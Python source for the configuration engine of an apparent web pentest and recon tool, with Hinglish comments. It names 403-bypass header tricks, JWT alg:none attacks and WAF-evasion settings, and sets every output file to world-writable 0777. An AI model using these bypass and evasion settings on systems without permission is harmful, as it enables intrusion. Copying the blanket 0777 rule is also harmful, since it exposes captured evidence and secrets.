#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
WASP ULTRA CONFIG ENGINE v3.0.0
================================
Ek hi config.json -> HAR phase (P2 understand, P3 passive, P4 active, P5 content,
P6 tech, P7 js, P8 surface, P11 access) ek jaisi tuning, security model aur
bypass-kits use kare. "har har phase me kaam aaye" - yahi contract hai.

Commands:
  init                 mega config.json likho (agar nahi hai)
  validate [path]      poora schema + security-model validate
  show [path]          readable summary (profile, posture, budgets, phases)
  explain [key]        har key ka Hinglish matlab
  profile NAME [path]  ULTRA profile flat keys me likho (ghost/stealth/balanced/redteam/audit)
  doctor [path]        15+ sanity checks + --fix (RWX repair, upgrade hint)
  upgrade [path]       purane config me naye keys add karo (user values kabhi overwrite nahi)
  flatten [path]       runtime flat keyspace print karo (jo Cfg/modules padhte hain)
  diff A B             do configs compare karo
  bypass 403|jwt|cors|encode|ratelimit ...   OFFLINE attack-kit generator (0 requests)
  selftest             engine internal checks

Security model (Layer 4 + RWX standing rule):
  TARGETS  = READ-ONLY (GET/HEAD/OPTIONS) + scope firewall; writes = sirf explicit opt-in
  RESULTS  = rwxrwxrwx (0777) - config, kits, reports sab

Python: 3.8+ (koi third-party dependency nahi)
"""

import os
import sys
import json
import copy
import base64
import shutil
import hashlib
import binascii
import urllib.parse

__version__ = "3.0.0"
ENGINE = "wasp_config.py"

# ---------------------------------------------------------------------------
# RWX STANDING RULE (user memory): har deliverable/output file ko
# read+write+execute (0777 rwxrwxrwx) milna chahiye. Engine apne saare
# outputs (kits/reports/fixed configs) + config file par ye enforce karta hai.
# ---------------------------------------------------------------------------
def _rwx_result(path):
    """RWX RULE: result file/dir ko 0777 do (best-effort, kabhi crash nahi)."""
    try:
        os.chmod(path, 0o777)
        return True
    except Exception:
        return False


def _rwx_tree(root, stats=None):
    """RWX RULE: poore result tree ko walk karke 0777 do (FINAL SWEEP)."""
    if not root or not os.path.isdir(root):
        return 0
    n = 0
    for dirpath, _dirnames, filenames in os.walk(root):
        _rwx_result(dirpath)
        n += 1
        for fn in filenames:
            if _rwx_result(os.path.join(dirpath, fn)):
                n += 1
                if stats is not None:
                    stats["fixed"] = stats.get("fixed", 0) + 1
    return n


def _non777_count(root):
    """Doctor ke liye: tree me kitni files/dirs par 0777 NAHI hai."""
    bad = []
    if not root or not os.path.isdir(root):
        return bad
    for dirpath, _dirnames, filenames in os.walk(root):
        try:
            if oct(os.stat(dirpath).st_mode & 0o777) != "0o777":
                bad.append(dirpath)
        except Exception:
            pass
        for fn in filenames:
            p = os.path.join(dirpath, fn)
            try:
                if oct(os.stat(p).st_mode & 0o777) != "0o777":
                    bad.append(p)
            except Exception:
                pass
    return bad


# ---------------------------------------------------------------------------
# COLORS (NO_COLOR env friendly)
# ---------------------------------------------------------------------------
if os.environ.get("NO_COLOR"):
    C_G, C_R, C_Y, C_C, C_B, C_D, C_N = "", "", "", "", "", "", ""
else:
    C_G, C_R, C_Y, C_C, C_B, C_D, C_N = ("\033[92m", "\033[91m", "\033[93m",
                                         "\033[96m", "\033[1m", "\033[2m", "\033[0m")


def ok(m):
    print("%s[+]%s %s" % (C_G, C_N, m))


def warn(m):
    print("%s[!]%s %s" % (C_Y, C_N, m))


def err(m):
    print("%s[x]%s %s" % (C_R, C_N, m))


def info(m):
    print("%s[*]%s %s" % (C_C, C_N, m))


def head(m):
    print("\n%s%s== %s ==%s" % (C_B, C_C, m, C_N))


# ---------------------------------------------------------------------------
# CONTRACT: poora flat keyspace jo Cfg + modules padhte hain.
# key -> (type, default). Ye schema validation, upgrade aur explain ka base hai.
# ---------------------------------------------------------------------------
T_FLOAT, T_INT, T_BOOL, T_STR, T_LIST, T_DICT = ("float", "int", "bool", "str", "list", "dict")

CONTRACT = {
    # ---- core engine (wasp_core.DEFAULT_CONFIG) ----
    "rate_limit": (T_FLOAT, 4.0), "jitter": (T_FLOAT, 0.35),
    "concurrency": (T_INT, 8), "timeout": (T_INT, 12),
    "retries": (T_INT, 2), "backoff": (T_FLOAT, 1.5),
    "max_requests": (T_INT, 20000), "redirects": (T_INT, 5),
    "verify_tls": (T_BOOL, False), "proxy": (T_STR, None),
    "user_agent": (T_STR, ""), "rotate_user_agents": (T_BOOL, False),
    "accept_encoding": (T_STR, "gzip, deflate"),
    "custom_headers": (T_DICT, {}), "retry_status": (T_LIST, [429, 500, 502, 503, 504]),
    "adaptive_throttle": (T_BOOL, True), "negative_cache": (T_BOOL, True),
    "resolvers": (T_LIST, []), "user_agents": (T_LIST, []),
    # ---- safety / evidence ----
    "allow_active": (T_BOOL, True), "allow_destructive": (T_BOOL, False),
    "allow_write_http": (T_BOOL, False),
    "save_bodies": (T_BOOL, True), "save_replays": (T_BOOL, True),
    "max_body_store": (T_INT, 262144), "findings_min_severity": (T_STR, "info"),
    "respect_robots": (T_BOOL, False),
    "content_wordlist_file": (T_STR, None),
    # ---- engine extras (wasp_config) ----
    "profile": (T_STR, "balanced"),
    "results_rwx": (T_BOOL, True), "results_base": (T_STR, "engines"),
    "pii_redact": (T_BOOL, True), "secrets_redact": (T_BOOL, True),
    "pipeline_order": (T_LIST, []),
    "ua_rotate_every": (T_INT, 25), "header_order_shuffle": (T_BOOL, False),
    "stealth_evasion": (T_BOOL, True),
    # ---- bypass engines ----
    "bypass_enabled": (T_BOOL, True), "bypass_path_variants": (T_BOOL, True),
    "bypass_header_spoof": (T_BOOL, True), "bypass_verb_tamper": (T_BOOL, True),
    "bypass_case_toggle": (T_BOOL, True), "bypass_encoding": (T_BOOL, True),
    "bypass_suffix_tricks": (T_BOOL, True), "bypass_ip_headers": (T_BOOL, True),
    "bypass_method_override": (T_BOOL, True), "bypass_double_confirm": (T_BOOL, True),
    "bypass_max_probes": (T_INT, 60), "bypass_jwt_attacks": (T_BOOL, True),
    "bypass_cors_probe": (T_BOOL, True),
    # ---- P2 understand ----
    "understand_enabled": (T_BOOL, True), "understand_js_max": (T_INT, 60),
    # ---- P3 passive ----
    "passive_enabled": (T_BOOL, True), "passive_perm_max": (T_INT, 600),
    "passive_resolve_max": (T_INT, 3000),
    # ---- P4 active ----
    "active_enabled": (T_BOOL, True), "active_vhost_max": (T_INT, 48),
    "active_waf_probe_max": (T_INT, 12), "active_svc_max": (T_INT, 40),
    # ---- P5 content ----
    "content_enabled": (T_BOOL, True), "content_max_depth": (T_INT, 2),
    "content_level_cap": (T_INT, 900), "content_total_cap": (T_INT, 4000),
    "content_global_cap": (T_INT, 12000), "content_dirlist_children": (T_INT, 40),
    "content_dirlist_max": (T_INT, 200), "content_dirlisting_parse": (T_BOOL, True),
    "content_nested_sitemap": (T_BOOL, True), "content_authwall_detect": (T_BOOL, True),
    "content_secret_sniff": (T_BOOL, True), "content_cms_packs": (T_BOOL, True),
    "content_cms_max": (T_INT, 40), "content_api_versions": (T_BOOL, True),
    "content_ext_max": (T_INT, 600), "content_case_variants": (T_BOOL, False),
    # ---- P6 tech ----
    "tech_enabled": (T_BOOL, True), "tech_probe_paths": (T_BOOL, True),
    "tech_probe_max": (T_INT, 60), "tech_js_fetch": (T_BOOL, True),
    "tech_js_fetch_limit": (T_INT, 6), "tech_favicon": (T_BOOL, True),
    "tech_behavior": (T_BOOL, True), "tech_allow_trace": (T_BOOL, True),
    "tech_waf_trigger": (T_BOOL, True), "tech_gql_probe": (T_BOOL, True),
    "tech_gql_post_max": (T_INT, 2), "tech_sso_probe": (T_BOOL, True),
    "tech_meta_probe": (T_BOOL, True), "tech_version_extract": (T_BOOL, True),
    "tech_observation_cap": (T_INT, 40),
    # ---- P7 js ----
    "js_enabled": (T_BOOL, True), "js_max_assets": (T_INT, 150),
    "js_max_map_sources": (T_INT, 6), "js_inline_analysis": (T_BOOL, True),
    "js_map_probe_max": (T_INT, 40),
    # ---- P8 surface ----
    "surface_enabled": (T_BOOL, True), "surface_min_priority": (T_FLOAT, 22.0),
    "surface_top": (T_INT, 60), "surface_budget_minutes": (T_FLOAT, 90.0),
    "surface_dag_max": (T_INT, 12), "surface_diff": (T_BOOL, True),
    # ---- P11 access ----
    "access_enabled": (T_BOOL, True), "access_surface_cap": (T_INT, 30),
    "access_template_cap": (T_INT, 12), "access_enum_probes": (T_INT, 6),
    "access_bypass_probes": (T_INT, 40), "access_gql_ops_max": (T_INT, 6),
    "access_allow_write_probes": (T_BOOL, False),
    "access_allow_neighbour_probe": (T_BOOL, True),
    "access_sim_confirm": (T_FLOAT, 0.92), "access_sim_suspect": (T_FLOAT, 0.75),
    "access_own_baseline_sim": (T_FLOAT, 0.985),
    "access_sessions": (T_LIST, []), "access_victim_known_ids": (T_LIST, []),
    "access_manual_requests": (T_LIST, []),
}

PHASE_KEYS = {
    "understand": [k for k in CONTRACT if k.startswith("understand_")],
    "passive": [k for k in CONTRACT if k.startswith("passive_")],
    "active": [k for k in CONTRACT if k.startswith("active_")],
    "content": [k for k in CONTRACT if k.startswith("content_") and k != "content_wordlist_file"],
    "tech": [k for k in CONTRACT if k.startswith("tech_")],
    "js": [k for k in CONTRACT if k.startswith("js_")],
    "surface": [k for k in CONTRACT if k.startswith("surface_")],
    "access": [k for k in CONTRACT if k.startswith("access_")],
}

MODULE_ALIAS = {"understand": "P2", "passive": "P3", "active": "P4", "content": "P5",
                "tech": "P6", "js": "P7", "surface": "P8", "access": "P11"}

VALID_PROFILES = ("ghost", "stealth", "balanced", "redteam", "audit")
LAYER4_METHODS = ("GET", "HEAD", "OPTIONS")

# Nested blocks jo engine consume karta hai (flat contract ka hissa nahi)
ENGINE_BLOCKS = ("_GUIDE", "_meta", "security_model", "profiles", "bypass_kit",
                 "auth", "wordlists", "reporting")


# ---------------------------------------------------------------------------
# ULTRA PROFILES (engine-level; flat keys me likhi jaati hain taaki HAR phase
# same tuning use kare - wasp.py tune/core apply_profile ke saath compatible)
# ---------------------------------------------------------------------------
PROFILES_ULTRA = {
    "ghost": {
        "rate_limit": 0.8, "jitter": 0.65, "concurrency": 1, "timeout": 25,
        "retries": 3, "backoff": 2.0, "rotate_user_agents": True, "adaptive_throttle": True,
        "bypass_enabled": False, "bypass_max_probes": 0,
        "understand_js_max": 30, "content_total_cap": 1500, "content_global_cap": 4000,
        "tech_probe_max": 25, "js_max_assets": 60, "access_bypass_probes": 10,
    },
    "stealth": {
        "rate_limit": 1.2, "jitter": 0.55, "concurrency": 2, "timeout": 20, "retries": 3,
        "rotate_user_agents": True, "adaptive_throttle": True, "bypass_max_probes": 30,
    },
    "balanced": {
        "rate_limit": 4.0, "jitter": 0.35, "concurrency": 8, "timeout": 12, "retries": 2,
        "rotate_user_agents": False, "bypass_max_probes": 60,
    },
    "redteam": {
        "rate_limit": 8.0, "jitter": 0.25, "concurrency": 12, "timeout": 10, "retries": 2,
        "rotate_user_agents": True, "ua_rotate_every": 12, "save_bodies": True,
        "save_replays": True, "max_body_store": 1048576, "bypass_enabled": True,
        "bypass_max_probes": 120, "content_total_cap": 6000, "content_global_cap": 16000,
        "js_max_assets": 250, "tech_probe_max": 90, "access_bypass_probes": 80,
        "access_surface_cap": 60, "surface_top": 100, "surface_budget_minutes": 120.0,
    },
    "audit": {
        "save_bodies": True, "save_replays": True, "max_body_store": 1048576,
        "rate_limit": 2.0, "bypass_enabled": False, "bypass_max_probes": 0,
        "findings_min_severity": "low", "access_allow_write_probes": False,
    },
}

# ---------------------------------------------------------------------------
# CONFIG DOCS (Hinglish) - explain command ka payload
# ---------------------------------------------------------------------------
CONFIG_DOCS = {
    "rate_limit": "requests/second (global). 4.0 balanced; 0.8 ghost; 8 redteam",
    "jitter": "rate par random +/- fraction - naive rate-limit detection se bachav",
    "concurrency": "parallel worker threads (mod_js 8 par cap karta hai)",
    "timeout": "per-request timeout seconds",
    "retries": "transient failure (429/5xx) par retries",
    "backoff": "retry ka exponential backoff base",
    "max_requests": "TOTAL request budget - hard kill switch (poore run ka)",
    "redirects": "max redirect hops (chain manually scope-checked hoti hai)",
    "verify_tls": "TLS cert verify (lab me false; production pe true rakhna better)",
    "proxy": "upstream proxy (e.g. http://127.0.0.1:8080 Burp ke liye)",
    "user_agent": "base User-Agent (rotate off ho to yahi jayega)",
    "rotate_user_agents": "per-request random UA (stealth/ghost/redteam)",
    "ua_rotate_every": "N requests baad UA switch (rotate on hone par)",
    "header_order_shuffle": "header order randomize (advanced WAF fingerprint evasion - experimental)",
    "accept_encoding": "Accept-Encoding header value",
    "custom_headers": "har request ke saath extra headers (auth tokens yahan bhi daal sakte ho)",
    "retry_status": "in status codes par retry hoga",
    "adaptive_throttle": "WAF/429 signs par auto slow-down",
    "negative_cache": "dead host:port yaad rakhna (retry band)",
    "resolvers": "DNS resolvers (passive phase resolve ke liye)",
    "user_agents": "UA rotation pool (kam se kam 3 rakho)",
    "allow_active": "active modules allowed (P4/P5/P6 ke probes)",
    "allow_destructive": "kabhi bhi true na karo jab tak RoE explicitly na bole",
    "allow_write_http": "LAYER 4 MASTER SWITCH: false = targets par sirf GET/HEAD/OPTIONS",
    "save_bodies": "raw bodies evidence me save",
    "save_replays": "curl replay scripts evidence me",
    "max_body_store": "per-response evidence body cap (bytes)",
    "findings_min_severity": "aggregate/report me is severity se neeche chhupao",
    "respect_robots": "robots.txt respect (ghost/audit me true recommended)",
    "content_wordlist_file": "content phase ka extra wordlist file (na do to builtin synthesis)",
    "profile": "engine profile naam (ghost/stealth/balanced/redteam/audit)",
    "results_rwx": "RWX STANDING RULE: results par 0777 enforce (kabhi false mat karna)",
    "results_base": "results root folder (engagement iske andar banta hai)",
    "pii_redact": "findings me PII (email/phone/JWT) mask",
    "secrets_redact": "secrets hamesha redacted save hote hain",
    "pipeline_order": "module run order (runall isi sequence me chalata hai)",
    "stealth_evasion": "stealth helpers on (UA rotation timing, jitter hints)",
    "bypass_enabled": "bypass engines master switch (kits OFFLINE banti hain, fire karne wale probes read-only)",
    "bypass_path_variants": "403/401 path variant family (encoding/dots/slashes/..;/)",
    "bypass_header_spoof": "X-Original-URL / X-Rewrite-URL / X-Host family",
    "bypass_verb_tamper": "HEAD/OPTIONS/PATCH verb tampering family",
    "bypass_case_toggle": "/admin -> /ADMIN case toggle family",
    "bypass_encoding": "URL/double-URL/unicode/HTML/base64/hex payload layers",
    "bypass_suffix_tricks": "/admin.json, /admin;.js jaise suffix tricks",
    "bypass_ip_headers": "X-Forwarded-For: 127.0.0.1 wali IP-trust headers",
    "bypass_method_override": "X-HTTP-Method-Override headers",
    "bypass_double_confirm": "bypass hit dobara confirm hota hai (false-positive kam)",
    "bypass_max_probes": "per-target total bypass requests cap (budget)",
    "bypass_jwt_attacks": "JWT alg:none / kid-injection / claim-swap kit",
    "bypass_cors_probe": "CORS misconfiguration test origins",
    "understand_enabled": "P2 understand module on/off",
    "understand_js_max": "P2 max JS files deep-analysis",
    "passive_enabled": "P3 passive recon on/off (target par request NAHI jata)",
    "passive_perm_max": "P3 subdomain permutation cap",
    "passive_resolve_max": "P3 DNS resolve budget",
    "active_enabled": "P4 active recon on/off",
    "active_vhost_max": "P4 vhost candidates per host",
    "active_waf_probe_max": "P4 WAF behavioral probes per host (read-only)",
    "active_svc_max": "P4 service HTTP fingerprint cap",
    "content_enabled": "P5 content enumeration on/off",
    "content_max_depth": "directory recursion depth",
    "content_level_cap": "per-level probe cap",
    "content_total_cap": "total probe cap (is run ka)",
    "content_global_cap": "global request cap (poore content phase ka)",
    "content_dirlist_children": "dir-listing se max children probe",
    "content_dirlist_max": "max dir-listing pages parse",
    "content_dirlisting_parse": "dir-listing parse on/off",
    "content_nested_sitemap": "nested sitemap follow",
    "content_authwall_detect": "auth-wall classification",
    "content_secret_sniff": "16-pattern secret sniffing (redacted)",
    "content_cms_packs": "CMS-specific packs (WP/Drupal/Joomla...)",
    "content_cms_max": "CMS pack probe cap",
    "content_api_versions": "versioned API prober (/api/v1)",
    "content_ext_max": "interesting-extension probe cap",
    "content_case_variants": "case variants probing (noise badhta hai - off rakho)",
    "tech_enabled": "P6 tech ID on/off",
    "tech_probe_paths": "default-path probing (CMS markers)",
    "tech_probe_max": "per-host probe budget",
    "tech_js_fetch": "JS assets fetch karke mine",
    "tech_js_fetch_limit": "per-host max JS fetch",
    "tech_favicon": "favicon mmh3 hash (Shodan pivot)",
    "tech_behavior": "OPTIONS/HEAD/TRACE/Range/ETag behavioral probes",
    "tech_allow_trace": "TRACE probe (safe, 1 request)",
    "tech_waf_trigger": "wafw00f-style 1-request WAF trigger",
    "tech_gql_probe": "GraphQL endpoint + introspection discovery",
    "tech_gql_post_max": "GraphQL read-only POST cap per host",
    "tech_sso_probe": "OIDC/SAML discovery probes",
    "tech_meta_probe": "robots/humans/security.txt/AASA probes",
    "tech_version_extract": "version extraction + EOL/CVE stale rules",
    "tech_observation_cap": "max observations (report size bound)",
    "js_enabled": "P7 JS surface on/off",
    "js_max_assets": "max JS assets analyze",
    "js_max_map_sources": "sourcemap original sources limit",
    "js_inline_analysis": "inline <script> analysis",
    "js_map_probe_max": ".map probe budget",
    "surface_enabled": "P8 surface mapping on/off (0 requests - pure analysis)",
    "surface_min_priority": "is priority se neeche nodes filter",
    "surface_top": "top-N priority queue size",
    "surface_budget_minutes": "P8 planner ka time budget",
    "surface_dag_max": "attack-path DAG max paths",
    "surface_diff": "run-to-run diff generate",
    "access_enabled": "P11 access/IDOR on/off",
    "access_surface_cap": "matrix/engines me max endpoints",
    "access_template_cap": "IDOR template cap",
    "access_enum_probes": "neighbour/decode probe cap (GET only)",
    "access_bypass_probes": "403-bypass requests cap",
    "access_gql_ops_max": "GraphQL BOLA type cap",
    "access_allow_write_probes": "mass-assignment/PUT-DELETE probes - DEFAULT OFF, RoE ke bina ON na karo",
    "access_allow_neighbour_probe": "+/-ID window probing (GET, bounded)",
    "access_sim_confirm": "victim-truth similarity >= ye -> CONFIRMED",
    "access_sim_suspect": "similarity >= ye -> SUSPECTED",
    "access_own_baseline_sim": "swapped ~ own-baseline -> SAFE",
    "access_sessions": "two-account sessions [{name, cookie_header, priv, known_ids, markers}]",
    "access_victim_known_ids": "global victim object IDs fallback",
    "access_manual_requests": "raw Burp request strings (IDOR templates)",
}


# ---------------------------------------------------------------------------
# LOAD / FLATTEN / SECURITY ENFORCEMENT
# ---------------------------------------------------------------------------
def load_json(path):
    with open(path, "r") as f:
        return json.load(f)


def save_json_rwx(path, obj):
    """save + RWX RULE (0777) - engine ka har output."""
    d = os.path.dirname(os.path.abspath(path))
    if d and not os.path.isdir(d):
        os.makedirs(d, exist_ok=True)
    tmp = path + ".tmp"
    with open(tmp, "w") as f:
        json.dump(obj, f, indent=2, ensure_ascii=False)
    os.replace(tmp, path)
    _rwx_result(path)
    _rwx_result(d)
    return path


def _basic_b64(u, p):
    raw = ("%s:%s" % (u, p)).encode("utf-8", "replace")
    return "Basic " + base64.b64encode(raw).decode("ascii")


def flatten(data, report=None):
    """Mega config -> runtime flat keyspace (jo Cfg/modules padhte hain).

    Mirror rules (predictable):
      - flat key already set  -> flat wins (nested block sirf fallback hai)
      - auth block            -> custom_headers me merge (auth same-name par jeetta hai)
      - wordlists.content_extra -> content_wordlist_file (agar flat null)
      - reporting.min_severity  -> findings_min_severity (agar flat default 'info')
      - security_model        -> ENFORCE (safety overrides, niche dekho)
    """
    if report is None:
        report = {"mirrors": [], "enforced": []}
    out = copy.deepcopy(data)

    # strip pure-doc keys
    for k in list(out.keys()):
        if k.startswith("_doc") or k == "_GUIDE":
            out.pop(k)
        elif k == "_meta":
            out["meta"] = out.pop("_meta")

    # --- auth block -> custom_headers ---
    auth = out.get("auth") or {}
    mode = str(auth.get("mode", "none")).lower().strip()
    hdr = dict(out.get("custom_headers") or {})
    if mode and mode != "none":
        add = {}
        if mode == "cookie" and auth.get("cookie_header"):
            add["Cookie"] = str(auth["cookie_header"])
        elif mode == "bearer" and auth.get("bearer_token"):
            add["Authorization"] = "Bearer %s" % str(auth["bearer_token"]).strip()
        elif mode == "basic" and auth.get("basic_user"):
            add["Authorization"] = _basic_b64(str(auth.get("basic_user", "")),
                                              str(auth.get("basic_pass", "")))
        elif mode == "header" and auth.get("header_name"):
            add[str(auth["header_name"])] = str(auth.get("header_value", ""))
        for k, v in add.items():
            hdr[k] = v                      # auth wins on same-name
            report["mirrors"].append("auth.%s -> custom_headers[%s]" % (mode, k))
        out["custom_headers"] = hdr

    # --- wordlists mirror ---
    wl = out.get("wordlists") or {}
    if wl.get("content_extra") and not out.get("content_wordlist_file"):
        out["content_wordlist_file"] = str(wl["content_extra"])
        report["mirrors"].append("wordlists.content_extra -> content_wordlist_file")

    # --- reporting mirror ---
    rp = out.get("reporting") or {}
    if rp.get("min_severity") and out.get("findings_min_severity", "info") == "info" \
            and rp["min_severity"] != "info":
        out["findings_min_severity"] = str(rp["min_severity"])
        report["mirrors"].append("reporting.min_severity -> findings_min_severity")

    # --- SECURITY MODEL ENFORCEMENT (Layer 4) ---
    sm = out.get("security_model") or {}
    rom = tuple(str(m).upper() for m in (sm.get("read_only_methods") or LAYER4_METHODS))
    if rom != LAYER4_METHODS:
        raise ValueError("SECURITY: read_only_methods tamper nahi karne ka - "
                         "fixed %s rehna chahiye (mila: %s)" % (list(LAYER4_METHODS), list(rom)))
    if out.get("allow_write_http") and not sm.get("i_confirm_write_http"):
        out["allow_write_http"] = False
        report["enforced"].append("allow_write_http=true tha par "
                                  "security_model.i_confirm_write_http=false -> FORCE false "
                                  "(triple opt-in poora karo ya na karo)")
    for gate, why in (("access_allow_write_probes", "P11 write probes"),
                      ("allow_destructive", "destructive mode")):
        if out.get(gate):
            report["enforced"].append("%s ON hai (%s) - RoE me written permission honi chahiye"
                                      % (gate, why))

    # RWX standing rule: config file khud bhi 777
    if out.get("results_rwx", True) and isinstance(data, dict) and data.get("__path__"):
        _rwx_result(data["__path__"])

    return out


def apply_profile(data, name):
    """ULTRA profile ko flat keys par merge karo (returns changed keys list)."""
    name = (name or "").lower().strip()
    if name not in PROFILES_ULTRA:
        return None
    prof = PROFILES_ULTRA[name]
    changed = []
    for k, v in prof.items():
        if data.get(k) != v:
            data[k] = v
            changed.append(k)
    data["profile"] = name
    return changed


# ---------------------------------------------------------------------------
# VALIDATION (~30 rules)
# ---------------------------------------------------------------------------
def validate(data):
    """Returns (errors, warnings) - errors hon to run mat karo."""
    E, W = [], []
    flat_keys = [k for k in data.keys() if not k.startswith("_")
                 and k not in ENGINE_BLOCKS and k != "meta"]

    # unknown keys
    unknown = [k for k in flat_keys if k not in CONTRACT]
    if unknown:
        W.append("unknown keys (%d): %s - typo ya purana version? `upgrade` chalao"
                 % (len(unknown), ", ".join(sorted(unknown)[:8])))

    # types + ranges
    for k, (t, _d) in CONTRACT.items():
        if k not in data:
            continue
        v = data[k]
        tmap = {T_FLOAT: (int, float), T_INT: int, T_BOOL: bool, T_STR: str,
                T_LIST: list, T_DICT: dict}
        if t == T_STR and v is None:
            continue
        if t == T_FLOAT and isinstance(v, int) and not isinstance(v, bool):
            continue
        if not isinstance(v, tmap[t]):
            E.append("%s type galat (%s chahiye, mila %s)" % (k, t, type(v).__name__))

    def _num(k):
        try:
            return float(data.get(k, 0) or 0)
        except Exception:
            return 0.0

    if not (0 < _num("rate_limit") <= 1000):
        E.append("rate_limit (0,1000] me hona chahiye, mila %s" % data.get("rate_limit"))
    if not (1 <= int(_num("concurrency")) <= 128):
        E.append("concurrency [1,128] me hona chahiye")
    if not (1 <= int(_num("timeout")) <= 300):
        E.append("timeout [1,300] me hona chahiye")
    if int(_num("max_requests")) < 100:
        E.append("max_requests >= 100 rakho (warna engine chala hi nahi)")
    if _num("jitter") < 0 or _num("jitter") > 1:
        E.append("jitter [0,1] me hona chahiye")
    rs = data.get("retry_status")
    if rs is not None and (not isinstance(rs, list) or not all(isinstance(x, int) for x in rs)):
        E.append("retry_status ints ki list honi chahiye")

    # security model
    sm = data.get("security_model") or {}
    rom = tuple(str(m).upper() for m in (sm.get("read_only_methods") or LAYER4_METHODS))
    if rom != LAYER4_METHODS:
        E.append("security_model.read_only_methods FIXED hai %s (tamper = Layer4 todna)"
                 % list(LAYER4_METHODS))
    if data.get("allow_write_http") and not sm.get("i_confirm_write_http"):
        E.append("allow_write_http=true par security_model.i_confirm_write_http=false - "
                 "double opt-in missing (safety ke liye force-false hoga)")
    if data.get("allow_write_http") and sm.get("i_confirm_write_http"):
        W.append("allow_write_http=true CONFIRMED hai - ab targets par writes jaa sakte hai "
                 "(RoE me written permission ho tabhi)")
    if data.get("allow_destructive"):
        W.append("allow_destructive=true - RoE me explicit permission ho tabhi")
    if data.get("access_allow_write_probes"):
        W.append("access_allow_write_probes=true - P11 write probes ON hain (RoE check karo)")
    if not data.get("results_rwx", True):
        E.append("results_rwx=false allowed nahi (RWX STANDING RULE)")

    # profile
    prof = str(data.get("profile", "")).lower().strip()
    if prof and prof not in PROFILES_ULTRA and prof not in ("normal",):
        E.append("profile '%s' invalid - options: %s (ya 'normal')" % (prof, ", ".join(VALID_PROFILES)))

    # pipeline
    po = data.get("pipeline_order") or []
    if po:
        bad = [p for p in po if p not in PHASE_KEYS]
        if bad:
            E.append("pipeline_order me invalid module: %s" % ", ".join(bad))
        if len(set(po)) != len(po):
            E.append("pipeline_order me duplicates hain")

    # cross-keys
    if _num("content_total_cap") > _num("content_global_cap"):
        W.append("content_total_cap > content_global_cap - global hi jeetega (tehseer nahi)")
    if data.get("js_max_map_sources", 0) and data.get("js_max_assets", 0) \
            and int(_num("js_max_map_sources")) > int(_num("js_max_assets")):
        W.append("js_max_map_sources > js_max_assets - map sources cap assets se bada hai")
    a, b, c = _num("access_sim_confirm"), _num("access_sim_suspect"), _num("access_own_baseline_sim")
    if not (0 < b < a <= 1):
        E.append("access thresholds order todo: 0 < access_sim_suspect < access_sim_confirm <= 1")
    if not (a < c <= 1):
        E.append("access_own_baseline_sim > access_sim_confirm hona chahiye (0.985 default)")
    if data.get("rotate_user_agents") and len(data.get("user_agents") or []) < 3:
        W.append("rotate_user_agents=true par pool < 3 - rotation bekaar, pool bada karo")
    if int(_num("ua_rotate_every")) < 5 and data.get("rotate_user_agents"):
        W.append("ua_rotate_every < 5 - bahut jaldi switch, WAF ko pattern pakadne me madad")
    if prof == "redteam" and not data.get("bypass_enabled", True):
        W.append("redteam profile par bypass_enabled=false - kya hi redteam")
    if data.get("respect_robots") is False and prof in ("ghost", "audit"):
        W.append("%s profile me respect_robots=true recommended hai (noise kam)" % prof)
    if data.get("proxy"):
        W.append("proxy set hai (%s) - TLS interception note karo (MITM evidence)" % data.get("proxy"))
    if data.get("verify_tls") is False:
        W.append("verify_tls=false (lab default) - prod targets par true socho")

    # sessions schema
    for i, s in enumerate(data.get("access_sessions") or []):
        if not isinstance(s, dict) or not s.get("name") or not (s.get("cookie_header") or s.get("headers")):
            E.append("access_sessions[%d] me name + cookie_header/headers chahiye" % i)

    # budgets rough-sum
    reqs = (_num("content_global_cap") + _num("js_max_assets") * 2 + _num("tech_probe_max") * 4
            + _num("access_bypass_probes") + _num("bypass_max_probes") * 2)
    if reqs > _num("max_requests"):
        W.append("phase budgets ka rough-sum (%d) > max_requests (%s) - budget kill-switch "
                 "pehle phase beech me rok dega" % (int(reqs), data.get("max_requests")))

    return E, W


# ---------------------------------------------------------------------------
# UltraConfig - poora engine ek object me
# ---------------------------------------------------------------------------
class UltraConfig(object):
    """Mega config load + validate + flatten + real wasp_core.Cfg banao."""

    def __init__(self, path, apply_profile_name=None):
        self.path = os.path.abspath(path) if path else None
        self.raw = {}
        if self.path and os.path.exists(self.path):
            self.raw = load_json(self.path)
            if not isinstance(self.raw, dict):
                raise ValueError("config root ek object hona chahiye ({}), mila %s"
                                 % type(self.raw).__name__)
        elif self.path:
            warn("config file nahi mili (%s) -> contract defaults use ho rahe hain" % self.path)
        self.report = {"mirrors": [], "enforced": []}
        self.profile_applied = None
        if apply_profile_name:
            ch = apply_profile(self.raw, apply_profile_name)
            if ch is None:
                raise ValueError("profile '%s' invalid - options: %s"
                                 % (apply_profile_name, ", ".join(VALID_PROFILES)))
            self.profile_applied = apply_profile_name
            self.report["mirrors"].append("profile %s -> %d keys changed"
                                          % (apply_profile_name, len(ch)))
        self.flat = flatten(dict(self.raw, __path__=self.path), self.report)
        self.errors, self.warnings = validate(self.flat)

    # -- views ---------------------------------------------------------------
    def phase(self, module):
        """Ek phase ki saari keys (module ke contract keys hi return hote hain)."""
        keys = PHASE_KEYS.get(module)
        if keys is None:
            raise ValueError("unknown module '%s' - options: %s"
                             % (module, ", ".join(sorted(PHASE_KEYS))))
        return {k: self.flat.get(k, CONTRACT[k][1]) for k in keys}

    def get(self, key, default=None):
        return self.flat.get(key, default)

    @property
    def posture(self):
        """Security posture summary (doctor/show ke liye)."""
        sm = self.raw.get("security_model") or {}
        return {
            "read_only": list(LAYER4_METHODS),
            "allow_write_http": bool(self.flat.get("allow_write_http")),
            "write_confirmed": bool(sm.get("i_confirm_write_http")),
            "write_probes_p11": bool(self.flat.get("access_allow_write_probes")),
            "destructive": bool(self.flat.get("allow_destructive")),
            "results_rwx": bool(self.flat.get("results_rwx", True)),
            "bypass_enabled": bool(self.flat.get("bypass_enabled")),
            "bypass_budget": int(self.flat.get("bypass_max_probes", 0) or 0),
            "profile": str(self.flat.get("profile", "balanced")),
        }

    # -- real framework integration -------------------------------------------
    def make_cfg(self, core_dir=None):
        """Real wasp_core.Cfg return karo (HAR phase isi se chalta hai).

        core_dir: jis folder me wasp_core.py hai (default = config ke bagal ka
        folder, warna engine ka apna folder).
        """
        cdir = core_dir or (os.path.dirname(self.path) if self.path else os.path.dirname(
            os.path.abspath(__file__)))
        if cdir not in sys.path:
            sys.path.insert(0, cdir)
        try:
            import wasp_core as _core
        except Exception as e:
            raise ImportError("wasp_core.py load nahi hua (%s) - core_dir path check karo" % e)
